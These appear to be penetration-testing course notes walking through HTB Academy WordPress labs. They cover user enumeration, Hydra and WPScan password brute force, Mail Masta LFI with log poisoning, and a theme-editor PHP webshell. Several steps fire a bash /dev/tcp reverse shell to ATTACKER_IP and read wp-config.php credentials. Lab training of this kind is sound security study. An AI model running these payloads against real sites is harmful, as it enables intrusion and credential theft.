# WordPress Labs

> **Source:** HTB Academy — Attacking Common Applications (Skills Assessments)
> **Reference:** [[wordpress-methodology]] for full command syntax and technique details.

---

## Lab 1: Skills Assessment — Identify Upload Directory

**Objective:** Locate the WordPress upload directory and retrieve the flag file.

### Walkthrough

- [ ] Confirm WordPress is running:
```bash
curl -s http://$TARGET | grep -i 'wp-content'
```
- [ ] Browse the uploads directory (often has directory listing enabled):
```bash
curl -s http://$TARGET/wp-content/uploads/
```
- [ ] WordPress stores uploads in date-based subdirectories. Enumerate year/month:
```bash
for year in 2020 2021 2022 2023 2024; do
  for month in $(seq -w 1 12); do
    code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/wp-content/uploads/$year/$month/")
    if [ "$code" != "404" ] && [ "$code" != "403" ]; then
      echo "FOUND: /wp-content/uploads/$year/$month/ → $code"
    fi
  done
done
```
- [ ] List files in discovered directories:
```bash
curl -s "http://$TARGET/wp-content/uploads/YYYY/MM/" | grep -oP 'href="[^"]*"'
```
- [ ] Download the flag:
```bash
curl -s "http://$TARGET/wp-content/uploads/YYYY/MM/flag.txt"
```

> **If directory listing is disabled:** Use gobuster to brute force filenames within the upload path.
```bash
gobuster dir -u http://$TARGET/wp-content/uploads/2021/07/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x txt,pdf,png,zip
```

---

## Lab 2: User Enumeration

**Objective:** Discover valid WordPress usernames.

### Walkthrough

- [ ] Author ID enumeration (manual):
```bash
for i in $(seq 1 50); do
  result=$(curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "http://$TARGET/?author=$i")
  code=$(echo "$result" | awk '{print $1}')
  if [ "$code" = "301" ] || [ "$code" = "302" ]; then
    username=$(echo "$result" | grep -oP '/author/\K[^/]+')
    echo "ID $i → $username"
  fi
done
```
- [ ] REST API method:
```bash
curl -s http://$TARGET/wp-json/wp/v2/users | jq -r '.[].slug'
```
- [ ] WPScan method:
```bash
wpscan --url http://$TARGET --enumerate u
```
- [ ] Save discovered users:
```bash
# Combine all found usernames into one file
echo "admin" > users.txt
# Append other discovered users
```

**What to do with the usernames:**
- Feed them into brute force (Lab 3)
- Check for profile pages with leaked info: `http://$TARGET/author/USERNAME/`
- Try default passwords: `admin`, `password`, `Password1`, company name variations

---

## Lab 3: Login Brute Force with Hydra

**Objective:** Crack a WordPress login using brute force.

### Walkthrough

- [ ] First, identify the correct failure string by attempting a bad login:
```bash
curl -s -X POST "http://$TARGET/wp-login.php" \
  -d "log=admin&pwd=wrongpassword&wp-submit=Log+In" \
  | grep -oP '(Invalid username|incorrect password|Error|login_error)[^<]*'
```

- [ ] Hydra — brute force wp-login.php:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

- [ ] Hydra — with a user list:
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

- [ ] WPScan via xmlrpc (preferred — faster):
```bash
wpscan --url http://$TARGET --password-attack xmlrpc -U admin -P /usr/share/wordlists/rockyou.txt
```

- [ ] WPScan with user list via xmlrpc:
```bash
wpscan --url http://$TARGET --password-attack xmlrpc -U users.txt -P /usr/share/wordlists/rockyou.txt
```

**Troubleshooting:**
| Problem | Fix |
|---------|-----|
| Hydra reports every attempt as success | Wrong failure string — adjust the `F=` value |
| xmlrpc returns "parse error" | xmlrpc.php might be disabled — fall back to wp-login |
| Rate limiting / lockout | Add `-t 1` to slow down, or use smaller wordlists |
| HTTPS target | Add `s` → `https-post-form` in Hydra, `--disable-tls-checks` in WPScan |

---

## Lab 4: Mail Masta — LFI + Command Injection

**Objective:** Exploit the Mail Masta plugin LFI vulnerability to read sensitive files or gain code execution.

### Walkthrough

- [ ] Confirm Mail Masta is installed:
```bash
curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/wp-content/plugins/mail-masta/"
```
- [ ] Test LFI with `/etc/passwd`:
```bash
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```
- [ ] Try the alternative vulnerable endpoint:
```bash
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/lists/csvexport.php?pl=/etc/passwd"
```
- [ ] Read `wp-config.php` for database credentials:
```bash
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../wp-config.php" | base64 -d
```
- [ ] Read the flag file (try common locations):
```bash
# Direct path if known
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/flag.txt"

# Other common flag locations
for path in /flag.txt /home/flag.txt /root/flag.txt /var/www/flag.txt /var/www/html/flag.txt; do
  echo -n "$path → "
  curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$path"
  echo
done
```

### Escalation — LFI to RCE via Log Poisoning

- [ ] Identify the web server log location:
```bash
# Try common log paths via LFI
for log in /var/log/apache2/access.log /var/log/httpd/access_log /var/log/nginx/access.log; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=$log")
  echo "$log → $code"
done
```
- [ ] Inject PHP into the access log via User-Agent header:
```bash
curl -s "http://$TARGET/" -A "<?php system(\$_GET['cmd']); ?>"
```
- [ ] Execute commands through the poisoned log:
```bash
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log&cmd=id"
```
- [ ] Reverse shell:
```bash
# Start listener
nc -lvnp 4444

# Trigger reverse shell (URL-encode the payload)
curl -s "http://$TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

---

## Lab 5: Reverse Shell via Theme Editor

**Objective:** Use admin credentials to get a reverse shell through the WordPress Theme Editor.

### Prerequisites

- [ ] Valid admin credentials (from Lab 3 or provided)
- [ ] Attacker IP and open port for reverse shell

### Walkthrough

- [ ] Login to WordPress admin panel:
```
http://$TARGET/wp-admin/
```
- [ ] Navigate to **Appearance → Theme Editor**
- [ ] Select the **404 Template** (`404.php`) from the file list on the right
- [ ] Note the active theme name (shown at the top of the editor)
- [ ] Replace the entire content of `404.php` with:
```php
<?php system($_GET['cmd']); ?>
```
- [ ] Click **Update File**
- [ ] Test command execution:
```bash
curl -s "http://$TARGET/wp-content/themes/THEME_NAME/404.php?cmd=id"
```
- [ ] Confirm you have code execution (should return `uid=...`)
- [ ] Start a netcat listener:
```bash
nc -lvnp 4444
```
- [ ] Trigger reverse shell:
```bash
curl -s "http://$TARGET/wp-content/themes/THEME_NAME/404.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```
- [ ] Stabilize the shell once connected:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Post-Exploitation (from the shell)

- [ ] Grab wp-config.php:
```bash
cat /var/www/html/wp-config.php | grep -i 'DB_'
```
- [ ] Check for password reuse — try DB password for SSH:
```bash
ssh user@$TARGET
```
- [ ] Look for flags:
```bash
find / -name "flag*" -type f 2>/dev/null
cat /root/flag.txt 2>/dev/null || cat /home/*/flag.txt 2>/dev/null
```
- [ ] Check sudo permissions:
```bash
sudo -l
```
- [ ] Look for SUID binaries:
```bash
find / -perm -4000 -type f 2>/dev/null
```

---

## Lab Checklist — Summary

| Lab | Technique | Auth Required | Escalation Path |
|-----|-----------|---------------|-----------------|
| 1 | Upload directory enumeration | No | Info disclosure → flag |
| 2 | Author ID / REST API user enum | No | Usernames → brute force |
| 3 | Hydra / WPScan brute force | No | Creds → admin panel |
| 4 | Mail Masta LFI (CVE-2016-10956) | No | LFI → log poisoning → RCE |
| 5 | Theme Editor webshell | Yes (admin) | Webshell → reverse shell → privesc |

---

## External References

- [Mail Masta LFI — ExploitDB 40290](https://www.exploit-db.com/exploits/40290)
- [wpDiscuz RCE — ExploitDB 49967](https://www.exploit-db.com/exploits/49967)
- [HackTricks — WordPress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [Reverse Shell Cheat Sheet](https://www.revshells.com/)
